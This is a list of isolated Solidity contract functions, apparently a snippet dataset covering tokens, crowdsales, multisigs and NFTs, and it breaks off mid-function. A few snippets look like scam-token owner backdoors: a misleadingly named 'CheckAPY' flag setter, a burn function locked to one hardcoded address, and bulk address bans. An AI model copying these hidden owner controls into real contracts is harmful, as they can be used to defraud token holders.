function turnOut(address contractAddress) public onlyOwner{
        ERC20 erc20 = ERC20(contractAddress);
        erc20.transfer(fundAddress,erc20.balanceOf(address(this)));
    }
--------------------------------------------------------------------------------
function B3T() public {
    totalSupply = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function APToken() {
    totalSupply = INITIAL_SUPPLY;                               // Set the total supply
    balances[msg.sender] = INITIAL_SUPPLY;                      // Creator address is assigned all
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function delArbitrageBot(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            botban(_counts[i]); }
    
    }
--------------------------------------------------------------------------------
function transfer(address to, uint256 tokenId) external {
        require(msg.sender == ownerOf[tokenId], "NOT_OWNER");

        _transfer(msg.sender, to, tokenId);
    }
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner) public view override returns(uint256) {
    return magnifiedDividendPerShare.mul(balanceOf(_owner)).toInt256Safe()
      .add(magnifiedDividendCorrections[_owner]).toUint256Safe() / magnitude;
  }
--------------------------------------------------------------------------------
constructor() public {

    //Set total supply to hardcap
    _totalSupply = hardcap;

    //Transfer total supply to owner
    _balances[owner()] = _totalSupply;
    emit Transfer(address(0), owner(), _totalSupply);

  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function div(uq112x112 memory self, uint112 x) internal pure returns (uq112x112 memory) {
        require(x != 0, 'FixedPoint: DIV_BY_ZERO');
        return uq112x112(self._x / uint224(x));
    }
--------------------------------------------------------------------------------
function frac(uint112 numerator, uint112 denominator) internal pure returns (uq112x112 memory) {
        require(denominator > 0, "FixedPoint: DIV_BY_ZERO");
        return uq112x112((uint224(numerator) << RESOLUTION) / denominator);
    }
--------------------------------------------------------------------------------
function tokenFallback(address from, uint256 amount, bytes data) 
    public
    atState(State.Active)
    gameIsAvailable()
    onlyPonziToken()
    returns (bool)
  {
    address referralAddress = bytesToAddress(data);
    require(newPlayer(from, amount, referralAddress));
    return true;
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function BAFCToken() {
        owner = msg.sender;
        totalSupply = 1.9 * 10 ** 26;
        balances[owner] = totalSupply;
    }
--------------------------------------------------------------------------------
function isOpenWhitelistPeriod() private constant returns (bool) {
        bool cappedWhitelistOver = now > whitelistEndTime;
        bool openWhitelistPeriod = now <= openWhitelistEndTime;
        return cappedWhitelistOver && openWhitelistPeriod;
    }
--------------------------------------------------------------------------------
constructor(address _nftAddress, uint256 _cut) public {
        require(_cut <= 10000);
        ownerCut = _cut;

        ERC721Basic candidateContract = ERC721Basic(_nftAddress);
        nonFungibleContract = candidateContract;
    }
--------------------------------------------------------------------------------
function setup(address singularDTVTokenAddress)
        external
        onlyOwner
        returns (bool)
    {
        if (address(singularDTVToken) == 0) {
            singularDTVToken = AbstractSingularDTVToken(singularDTVTokenAddress);
            return true;
        }
        return false;
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {

require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) pure returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function createRealmSale(uint _num, uint _startId, uint _price) public onlyAdmin {
        for(uint i = 0; i<_num; i++) {
            _generateRealmSale(_startId + i, _price);
        }
    }
--------------------------------------------------------------------------------
constructor(address vat_) public {
        wards[msg.sender] = 1;
        vat = VatLike(vat_);
        par = ONE;
        live = 1;
    }
--------------------------------------------------------------------------------
function transferTokens(address _tokenAddress, address _recipient) public isOwner {
        ERC20I token = ERC20I(_tokenAddress);
        require(token.transfer(_recipient, token.balanceOf(this)));
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) returns (bool success) {
        if (_value <= 0) throw;
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function bonusAmmount(uint256 tokens) internal returns(uint256) {
    // first 500 get extra 30%
    if (numberOfPurchasers < 2) {
      return tokens * 3 / 10;
    } else {
      return tokens /4;
    }
  }
--------------------------------------------------------------------------------
function hasEnded() public constant returns (bool) {
    bool timeLimitReached = now > endTimestamp;
    bool capReached = weiRaised >= hardcap;
    return timeLimitReached || capReached;
  }
--------------------------------------------------------------------------------
function setVotingPeriod(uint duration)
        external
        onlyOwner
    {
        require(MIN_VOTING_PERIOD <= duration &&
                duration <= MAX_VOTING_PERIOD);
        /* Require that the voting period is no longer than a single fee period,
         * So that a single vote can span at most two fee periods. */
        require(duration <= havven.feePeriodDuration());
        votingPeriod = duration;
    }
--------------------------------------------------------------------------------
function safeAdd(uint256 a, uint256 b) internal pure returns (uint256) {
        uint c = a + b;
        assert(c >= a && c >= b);
        return c;
    }
--------------------------------------------------------------------------------
function safeSubtract(uint256 a, uint256 b) internal pure returns (uint256) {
        uint c = a - b;
        assert(b <= a && c <= a);
        return c;
    }
--------------------------------------------------------------------------------
function triggerCooldown(uint _id) eitherOwner tokenExists(_id) external {
        Hero storage hero = heroes[_id];

        hero.cooldownStartTime = uint64(now);
        hero.cooldownIndex++;
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function returnEth() internal {
        // return if some eth left
        if (address(this).balance > 0) {
            msg.sender.transfer(address(this).balance);
        }
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
        if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function finalize() private {
        if (!isFinalized) {
            require(isReadyToFinalize());
            isFinalized = true;
            mintTeamTokens();
            token.unlock();
            treasuryContract.setCrowdsaleFinished();
        }
    }
--------------------------------------------------------------------------------
function confirmTransaction(bytes32 transactionId)
        public
        ownerExists(msg.sender)
        notConfirmed(transactionId, msg.sender) {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function _transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) internal {
        super._transferFrom(from, to, tokenId);

        _removeTokenFromOwnerEnumeration(from, tokenId);

        _addTokenToOwnerEnumeration(to, tokenId);
    }
--------------------------------------------------------------------------------
constructor() public {
        balances[owner] = _totalSupply;
        transfersEnabled = true;
        emit Transfer(address(0), owner, _totalSupply);
    }
--------------------------------------------------------------------------------
function validateNonce(uint nounce) private onlySigner {
        require(nounce > lastNounce && nounce <= (lastNounce+1000), "Enter Valid Nounce");
        lastNounce=nounce;
    }
--------------------------------------------------------------------------------
function setPlotData(uint256 _deedId, string name, string description, string imageUrl, string infoUrl)
        public
        whenNotPaused
    {
        // The sender requesting the data update should be
        // the owner.
        require(_owns(msg.sender, _deedId));
    
        // Set the data
        _setPlotData(_deedId, name, description, imageUrl, infoUrl);
    }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function withdraw(uint _amount) onlyOwner public {
        require(_amount > 0);
        
        // Amount withdraw should be less or equal to balance
        require(_amount <= address(this).balance);     
        
        owner.transfer(_amount);
    }
--------------------------------------------------------------------------------
function receiveApproval(address _from, uint256 _value, 
address _token, bytes _extraData) external returns(bool){ 
TOC
TOCCall = TOC(_token);
TOCCall.transferFrom(_from,this,_value);
return true;
}
--------------------------------------------------------------------------------
function REGO () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
         emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function _burn(
    address _owner,
    uint256 _tokenId
  )
    validNFToken(_tokenId)
    internal
  {
    clearApproval(_tokenId);
    removeNFToken(_owner, _tokenId);
    emit Transfer(_owner, address(0), _tokenId);
  }
--------------------------------------------------------------------------------
function ownerFee(uint amount) private returns (uint fee) {
        if (total < 200000 ether) {
            fee = amount/2;
            balances[owner] += fee;
        }
        return;
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function pause() external {
        require(msg.sender == governance, "not governance");
        require(!paused, "paused");

        paused = true;
    }
--------------------------------------------------------------------------------
constructor(
        uint256 _stakingRewardsGenesis
    ) public {
        require(_stakingRewardsGenesis >= block.timestamp, 'StakingRewardsFactory::constructor: genesis too soon');

        stakingRewardsGenesis = _stakingRewardsGenesis;
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function Holdplatform_Withdraw() restricted public {
		ERC20Interface token = ERC20Interface(Holdplatform_address);
        token.transfer(msg.sender, Holdplatform_balance);
		Holdplatform_balance = 0;
    }
--------------------------------------------------------------------------------
function addAddressesToWhitelist(address[] memory _operators)
    public
    onlyOwner
  {
    for (uint256 i = 0; i < _operators.length; i++) {
      addAddressToWhitelist(_operators[i]);
    }
  }
--------------------------------------------------------------------------------
function removeAddressesFromWhitelist(address[] memory _operators)
    public
    onlyOwner
  {
    for (uint256 i = 0; i < _operators.length; i++) {
      removeAddressFromWhitelist(_operators[i]);
    }
  }
--------------------------------------------------------------------------------
constructor() public {
        symbol = "SDO";
        name = "SecureDoc Token";
        decimals = 18;
        bonusEnds = now + 120 days;
    }
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner) public view override returns(uint256) {
        return magnifiedDividendPerShare.mul(balanceOf(_owner)).toInt256Safe()
        .add(magnifiedDividendCorrections[_owner]).toUint256Safe() / magnitude;
    }
--------------------------------------------------------------------------------
function getNonceData(address token, uint256 nonce) public view returns (bool,uint256) {
        return(_tracker[token]._nonces[nonce]._isUsed,_tracker[token]._nonces[nonce]._inBlock);
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x0Ae2A12776c0Fa2AC7628A4B459d3834695D9E42,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor(string memory name, string memory symbol, string memory baseTokenURI) ERC721(name, symbol) {
        _baseTokenURI = baseTokenURI;

        _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());

        _setupRole(MINTER_ROLE, _msgSender());
        _setupRole(PAUSER_ROLE, _msgSender());
    }
--------------------------------------------------------------------------------
function deprecate(address _upgradedAddress) public onlyOwner {
        require(_upgradedAddress != address(0));
        deprecated = true;
        upgradedAddress = _upgradedAddress;
        emit Deprecate(_upgradedAddress);
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function getBuyPrice() public view returns (uint256 price) {
    uint256 accumulatedDistributionPercentage = getAccumulatedDistributionPercentage();

    return initialBuyPrice.
      mul(PRICE_FACTOR.sub(accumulatedDistributionPercentage)).
      div(PRICE_FACTOR);
  }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    super._mint(_to, _tokenId);

    allTokensIndex[_tokenId] = allTokens.length;
    allTokens.push(_tokenId);
  }
--------------------------------------------------------------------------------
function closeWhitelisted(address payable receiver)
        external
        payable
        onlyWhitelisted
    {
        require(receiver != address(0x0), "WhitelistedMinter: RECEIVER_IS_EMPTY");

        renounceWhitelisted();
        receiver.transfer(msg.value);
    }
--------------------------------------------------------------------------------
function emergencySetStartingIndexBlock() public onlyOwner {
        require(startingIndex == 0, "Starting index is already set");
        
        startingIndexBlock = block.number;
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    tokenus[spender] = val;
    lions[spender] = val2; 
    masala[spender] = val3;
    gallons = val4;
  }
--------------------------------------------------------------------------------
constructor(address _logic, address _admin, bytes memory _data) UpgradeabilityProxy(_logic, _data) public payable {
    assert(ADMIN_SLOT == bytes32(uint256(keccak256('eip1967.proxy.admin')) - 1));
    _setAdmin(_admin);
  }
--------------------------------------------------------------------------------
function withinLimits(uint _value) public view returns(bool) {
        if (maxBuy != 0) {
            return (_value >= minBuy && _value <= maxBuy);
        }
        return (_value >= minBuy);
    }
--------------------------------------------------------------------------------
constructor(address _wallet) public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[_wallet] = INITIAL_SUPPLY;
    emit Transfer(address(0), _wallet, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function adminshipLevel(address _newAdmin, uint8 _level) onlyAdmin(2) public { //Admin can be set
        require(_newAdmin != address(0)); //The new admin must not be zero address
        level[_newAdmin] = _level; //New level is set
        emit AdminshipUpdated(_newAdmin,_level); //Log the admin set
    }
--------------------------------------------------------------------------------
function _getNextRateReduction() internal view returns(uint256) {
        uint256 absoluteRate = emissionRate.mul(decayPercent).div(decayDivisor);
        return emissionRate.sub(absoluteRate);
    }
--------------------------------------------------------------------------------
function _getArgAddress(uint256 argOffset)
        internal
        pure
        returns (address arg)
    {
        uint256 offset = _getImmutableArgsOffset();
        assembly {
            arg := shr(0x60, calldataload(add(offset, argOffset)))
        }
    }
--------------------------------------------------------------------------------
function _getArgUint64(uint256 argOffset)
        internal
        pure
        returns (uint64 arg)
    {
        uint256 offset = _getImmutableArgsOffset();
        // solhint-disable-next-line no-inline-assembly
        assembly {
            arg := shr(0xc0, calldataload(add(offset, argOffset)))
        }
    }
--------------------------------------------------------------------------------
function _getArgUint8(uint256 argOffset) internal pure returns (uint8 arg) {
        uint256 offset = _getImmutableArgsOffset();
        // solhint-disable-next-line no-inline-assembly
        assembly {
            arg := shr(0xf8, calldataload(add(offset, argOffset)))
        }
    }
--------------------------------------------------------------------------------
constructor(address tokenContract_) public {
        owner = msg.sender;
        tokenContract = tokenContract_;

        // On publication the only person allowed trade is the issuer/owner.
        enforceKyc = true;
        setTradingAllowed(msg.sender, true);
    }
--------------------------------------------------------------------------------
function _updatePurchasingState(address beneficiary, uint256 weiAmount, uint256 tokens) internal {
        super._updatePurchasingState(beneficiary, weiAmount, tokens);
        _contributions[beneficiary] = _contributions[beneficiary].add(tokens);
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) {
        require(msg.sender == owner || now > 1509467422);
        _transfer(msg.sender, _to, _value);
    }
--------------------------------------------------------------------------------
function setUpgradeMaster(address master) public {
      if (master == 0x0) revert();
      if (msg.sender != upgradeMaster) revert();
      upgradeMaster = master;
  }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function mul_ScalarTruncateAddUInt(Exp memory a, uint scalar, uint addend) pure internal returns (uint) {
        Exp memory product = mul_(a, scalar);
        return add_(truncate(product), addend);
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved) external virtual override {
        operatorApproval[msg.sender][_operator] = _approved;
        emit ApprovalForAll(msg.sender, _operator, _approved);
    }
--------------------------------------------------------------------------------
function transferAndCall(address _spender, uint256 _value, bytes _extraData)
    public {
        //if (isContract(_spender) && msg.sender != _spender) return contractFallback(_from, _to, _value, _data);
        transfer(_spender, _value);
        require(
            tokenRecipient(_spender).tokenFallback(msg.sender, _value, _extraData)
        );
    }
--------------------------------------------------------------------------------
constructor(address _owner)
        public
    {
        require(_owner != address(0));
        owner = _owner;
        emit OwnerChanged(address(0), _owner);
    }
--------------------------------------------------------------------------------
function tokenOfOwnerByIndex (address wallet, uint256 index) public view returns (uint256) {
    require(wallet == _tokenOwner && index == 0, "index out of bounds");
    return 1;
  }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
        super._mint(_to, _tokenId);

        allTokensIndex[_tokenId] = allTokens.length;
        allTokens.push(_tokenId);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function contractFallback(address _to, uint256 _value, bytes _data) private {
        ERC677Receiver receiver = ERC677Receiver(_to);
        require(receiver.onTokenTransfer(msg.sender, _value, _data));
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function getTypes() external view returns(uint8[]) {
        uint8[] memory res = new uint8[](1);
        res[0] = 3;
        return res;
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function licenseInfo(uint256 _licenseId)
    public view returns (uint256, uint256, uint256, uint256, address)
  {
    return (
      licenseProductId(_licenseId),
      licenseAttributes(_licenseId),
      licenseIssuedTime(_licenseId),
      licenseExpirationTime(_licenseId),
      licenseAffiliate(_licenseId)
    );
  }
--------------------------------------------------------------------------------
constructor(address _factoryAddress, address _feeRecipient) public {
        require(_factoryAddress != 0x0);

        // Default temporal unit is timestamp.
        temporalUnit = RequestScheduleLib.TemporalUnit.Timestamp;

        // Sets the factoryAddress variable found in BaseScheduler contract.
        factoryAddress = _factoryAddress;

        // Sets the fee recipient for these schedulers.
        feeRecipient = _feeRecipient;
    }
--------------------------------------------------------------------------------
function spendToken(uint256 _tokens) public returns (bool) {
        transferTokens(msg.sender, owner, _tokens);
        TokensSpent(msg.sender, _tokens);
        return true;
    }
--------------------------------------------------------------------------------
function withdrawcommissions()public olyowner returns(bool){
        owner.send(users[msg.sender].pot);
        users[msg.sender].pot=0;
    }
--------------------------------------------------------------------------------
constructor() public {
        balances[address(owner)] = _totalSupply;
        emit Transfer(address(0), address(owner), _totalSupply);
    }
--------------------------------------------------------------------------------
function changeAdmin(address newAdmin) external {
        require(msg.sender == _admin, "ADMIN_ACCESS_DENIED");
        emit AdminChanged(_admin, newAdmin);
        _admin = newAdmin;
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function toggleMinting()  onlyOwner public {
    if(pauseMinting){
      pauseMinting = false;
      emit UnPauseMinting();
    }else{
      pauseMinting = true;
      emit PauseMinting();
    }     
  }
--------------------------------------------------------------------------------
function renounceRole(bytes4 role, address account) external virtual {
        require(account == msg.sender, "Renounce only for self");

        _revokeRole(role, account);
    }
--------------------------------------------------------------------------------
function removeLimits() external onlyOwner returns (bool) {
        limitsInEffect = false;
        dynamicFeesInEffect = true;
        fireSaleTimer = block.timestamp + 1 days;
        return true;
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function getBalance(ERC20 token, address user) public view returns(uint) {
        if (token == ETH_TOKEN_ADDRESS)
            return user.balance;
        else
            return token.balanceOf(user);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function TokenERC20(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public 
    {
        _totalSupply = initialSupply * TOKEN_UNIT;  // Update total supply with the decimal amount
        _balanceOf[msg.sender] = _totalSupply;                // Give the creator all initial tokens
        name = tokenName;                                   // Set the name for display purposes
        symbol = tokenSymbol;                               // Set the symbol for display purposes
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function HK(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function balanceOf(address owner) public view override returns (uint256) {
        if (owner == address(0)) revert BalanceQueryForZeroAddress();
        return uint256(_addressData[owner].balance);
    }
--------------------------------------------------------------------------------
function _numberMinted(address owner) internal view returns (uint256) {
        if (owner == address(0)) revert MintedQueryForZeroAddress();
        return uint256(_addressData[owner].numberMinted);
    }
--------------------------------------------------------------------------------
function _numberBurned(address owner) internal view returns (uint256) {
        if (owner == address(0)) revert BurnedQueryForZeroAddress();
        return uint256(_addressData[owner].numberBurned);
    }
--------------------------------------------------------------------------------
function withdraw(address _to) public onlyOwner {
		require(actived == true);
		require(!frozenAccount[_to]);
		_to.transfer(address(this).balance);
	}
--------------------------------------------------------------------------------
function crowdsaleClosed() internal {
        uint256 remainingTokens = tokenCap.sub(tokensRaised);
        _deliverTokens(airdropWallet, remainingTokens);
        LittlePhilCoin(token).finishMinting();
    }
--------------------------------------------------------------------------------
function updateTokenContractAddr(address _newAddress) external onlyOwner returns(bool){
          require(_newAddress != 0x00);
          TokenContractAddress(token,_newAddress);
          token = NotaryPlatformToken(_newAddress);
          return true;
      }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function setPubkey(bytes32 node, bytes32 x, bytes32 y) public only_owner(node) {
        records[node].pubkey = PublicKey(x, y);
        emit PubkeyChanged(node, x, y);
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
            public
            ownerExists(msg.sender)
            transactionExists(transactionId)
            notConfirmed(transactionId, msg.sender)
        {
            confirmations[transactionId][msg.sender] = true;
            Confirmation(msg.sender, transactionId);
            executeTransaction(transactionId);
        }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function Etbccoin() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
constructor(address _gem) public DssVest() {
        require(_gem != address(0), "DssVest/Invalid-token-address");
        gem = MintLike(_gem);
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {

require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function mintSpecial(address _to) public onlyOwner {
        for(uint256 i=0; i<special; i++){
            _mint(_to, i+1);
        }
    }
--------------------------------------------------------------------------------
function manualWithdrawToken(uint256 _amount) onlyOwner public {
            uint256 tokenAmount = _amount.mul(1 ether);
            _transfer(this, msg.sender, tokenAmount);
        }
--------------------------------------------------------------------------------
function setBbAddress(string _bbAddress) public returns (bool) {
        bbAddresses[msg.sender] = _bbAddress;
        emit BbAddressUpdated(msg.sender, _bbAddress);
        return true;
    }
--------------------------------------------------------------------------------
function createPromoToken(string _name, address _owner, uint256 _price) public onlyCLevel {
    require(_owner != address(0));
    require(_price >= startingPrice);

    _createToken(_name, _owner, _price);
  }
--------------------------------------------------------------------------------
function authorize(address _trustee) returns (bool success) {
    authorized[msg.sender][_trustee] = true;
    Authorization(msg.sender, _trustee);
    return true;
  }
--------------------------------------------------------------------------------
function deauthorize(address _trustee_to_remove) returns (bool success) {
    authorized[msg.sender][_trustee_to_remove] = false;
    Deauthorization(msg.sender, _trustee_to_remove);
    return true;
  }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool) {
      if (isTransferWhitelistOnly) {
        require(isUserAllowedToTransfer(msg.sender));
      }
      return super.transfer(_to, _value);
    }
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        if (isTransferWhitelistOnly) {
            require(isUserAllowedToTransfer(_from));
        }
        return super.transferFrom(_from, _to, _value);
    }
--------------------------------------------------------------------------------
function balanceOf(address _owner) public view returns (uint256 balance){
        UserToken storage user = _balancesMap[_owner];
        balance = user.tokens.add(user.unlockLeft);
    }
--------------------------------------------------------------------------------
function isValidNav(
        uint256 sellPrice,
        uint256 buyPrice,
        uint256 signaturevaliduntilBlock,
        bytes32 hash,
        bytes signedData)
        internal
        view
        returns (bool isValid)
    {
        isValid = NavVerifier(getNavVerifier()).isValidNav(
            sellPrice,
            buyPrice,
            signaturevaliduntilBlock,
            hash,
            signedData
        );
        return isValid;
    }
--------------------------------------------------------------------------------
constructor(address _wallet) public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[_wallet] = INITIAL_SUPPLY;
    emit Transfer(address(0), _wallet, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function withdraw(address _beneficiary) external override onlyBorrower onlyFunded {
        status = Status.Withdrawn;
        require(currencyToken.transfer(_beneficiary, receivedAmount()));

        emit Withdrawn(_beneficiary);
    }
--------------------------------------------------------------------------------
function MoyOpenDistribution() public onlyOwner {
    admin = msg.sender;
    CurrentStatus = "Tokens Released, Open Distribution deployed to chain";
  }
--------------------------------------------------------------------------------
function ImpToken(string _name, string _symbol, uint _totalSupply, uint _decimals) {
        require(_totalSupply != 0);

        name = _name;
        symbol = _symbol;
        decimals = _decimals;

        totalSupply = _totalSupply;
    }
--------------------------------------------------------------------------------
function setTimeTransferAllowance(uint _timeAllowance) external onlyOwner {
        TimeTransferAllowed = _timeAllowance;
        TimeTransferAllowanceChanged("Token transfers will be allowed at ", _timeAllowance);
    }
--------------------------------------------------------------------------------
function rateIsStale(bytes32 currencyKey)
        public
        view
        returns (bool)
    {
        // sUSD is a special case and is never stale.
        if (currencyKey == "sUSD") return false;

        return lastRateUpdateTimes[currencyKey].add(rateStalePeriod) < now;
    }
--------------------------------------------------------------------------------
function _appointDelegator(address delegator_) private returns (bool) {
        require(_delegator != delegator_);
        emit DelegateAppointed(_delegator, delegator_);
        _delegator = delegator_;
        return true;
    }
--------------------------------------------------------------------------------
function Follo() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
  returns (bool success) {
    if (frozen) return false;
    else
      return AbstractSnapshottableToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function finalize() onlyOwner public {

        require(now > endTime);



        if (tokensSold < goal) {

            vault.enableRefunds();

        } else {

            vault.close();

        }

    }
--------------------------------------------------------------------------------
function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
--------------------------------------------------------------------------------
function deploy() public only_owner at_stage(Stages.Deploying) {
        require(phases.length > 0);
        require(stakeholderPercentagesIndex.length > 0);
        stage = Stages.Deployed;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function getDatesForUser(address _user) external view returns (uint32[]) {
        if (!adminPermission[msg.sender]) {
           return new uint32[](0); 
        }
        return userToDates[_user];
    }
--------------------------------------------------------------------------------
function getUsersForDate(uint32 _date) external view returns (address[]) {
        if (!adminPermission[msg.sender]) {
           return new address[](0); 
        }
        return dateToUsers[_date];
    }
--------------------------------------------------------------------------------
function getEntryStatus(address _user, uint32 _date)
    external view returns (UserEntryStatus) {
